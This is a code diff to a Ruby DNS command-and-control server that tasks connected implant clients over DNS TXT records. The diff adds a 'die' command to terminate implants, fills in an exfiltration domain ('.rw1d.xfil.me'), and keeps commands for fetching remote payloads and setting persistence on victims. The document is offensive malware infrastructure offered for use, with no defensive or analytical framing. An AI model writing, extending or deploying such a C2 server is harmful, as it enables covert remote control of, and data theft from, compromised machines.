@@ -53,6 +53,7 @@ class DNSServer
     FETCH_FILE = 11
     QUERY_USERNAME = 12
     PERSIST = 13
+    DIE = 14
 
     # client operation types (server-side only)
     QUEUE_PUSH = 50
@@ -68,7 +69,7 @@ class DNSServer
     @chunk_length = 180
     @max_chunks = 6
     @clients = Array.new
-    @domain = '.sub.domain.tld' # set this!
+    @domain = '.rw1d.xfil.me'
     @listen_address = '0.0.0.0'
     @listen_port = 53
     @mutex = Mutex.new
@@ -90,6 +91,7 @@ class DNSServer
 
   def display_help
     puts "\nBuilt-in commands:\n"
+    puts "  die            - terminate client process"
     puts "  fetch <url>    - fetch a file from given URL (ex: fetch http://yoursite.com/agent.exe)"
     puts "  i              - display connected clients"
     puts "  i <client_id>  - interact with specified client"
@@ -115,9 +117,7 @@ class DNSServer
     id = @clients.size + 1
     ip = remote_host[3]
 
-    @mutex.synchronize {
-      @clients.push(Client.new(id, ip))
-    }
+    @mutex.synchronize { @clients.push(Client.new(id, ip)) }
 
     puts "\nNew client connected [id #{id}]"
 
@@ -204,14 +204,14 @@ class DNSServer
 
     a.push(r[0])
     a.push(r[1])
-    a.push(*[0x85, 0x80]) # standard reply
-    a.push(*[0x00, 0x01]) # number of questions
+    a.push(0x85, 0x80)  # standard reply
+    a.push(0x00, 0x01)  # number of questions
 
     a.push(0x00)
-    a.push(chunks.size)   # number of TXT answers
+    a.push(chunks.size) # number of TXT answers
 
-    a.push(*[0x00, 0x00]) # authority RRs
-    a.push(*[0x00, 0x00]) # additional RRs
+    a.push(0x00, 0x00)  # authority RRs
+    a.push(0x00, 0x00)  # additional RRs
 
     # copy hostname bytes from request
     i = 12
@@ -220,9 +220,9 @@ class DNSServer
       i += 1
     end
 
-    a.push(0x00) # null-terminate hostname bytes
-    a.push(*[0x00, 0x10]) # question type TXT
-    a.push(*[0x00, 0x01]) # question class IN (internet)
+    a.push(0x00)        # null-terminate hostname bytes
+    a.push(0x00, 0x10)  # question type TXT
+    a.push(0x00, 0x01)  # question class IN (internet)
 
     chunk_idx = 1
     chunks.each do |chunk|
@@ -230,11 +230,11 @@ class DNSServer
       chunk.insert(0, chunk_idx.to_s)
       chunk_idx += 1
 
-      a.push(*[0xc0, 0x0c]) # beginning of TXT record
-      a.push(*[0x00, 0x10]) # answer type TXT
-      a.push(*[0x00, 0x01]) # answer class IN (internet)
-      a.push(*[0x00, 0x00, 0x00, 0x01]) # TTL, 1 sec
-      a.push(0x00) # end of header
+      a.push(0xc0, 0x0c)             # beginning of TXT record
+      a.push(0x00, 0x10)             # answer type TXT
+      a.push(0x00, 0x01)             # answer class IN (internet)
+      a.push(0x00, 0x00, 0x00, 0x01) # TTL, 1 sec
+      a.push(0x00)                   # end of header
 
       a.push(chunk.length + 1)
       a.push(chunk.length)
@@ -285,7 +285,7 @@ class DNSServer
       # this is a bit of a hack - ignore packets that don't contain this string.
       # best bet is to use the bare domain string (without the TLD), e.g. "google" not "google.com"
       # since words are not separated by dots in the raw bytes.
-      next unless request.include?("???") # set this!
+      next unless request.include?("xfil") # set this!
 
       # send a NOP by default, or set appropriately below
       packet = create_packet(Op::NOP, "")
@@ -380,6 +380,12 @@ class DNSServer
 
         when "persist"
           client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::PERSIST, ""))
+
+        when "die"
+          puts "\nIf you really mean it, type 'DIE'."
+
+        when "DIE"
+          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::DIE, ""))
 
         when "?", "help"
           display_help
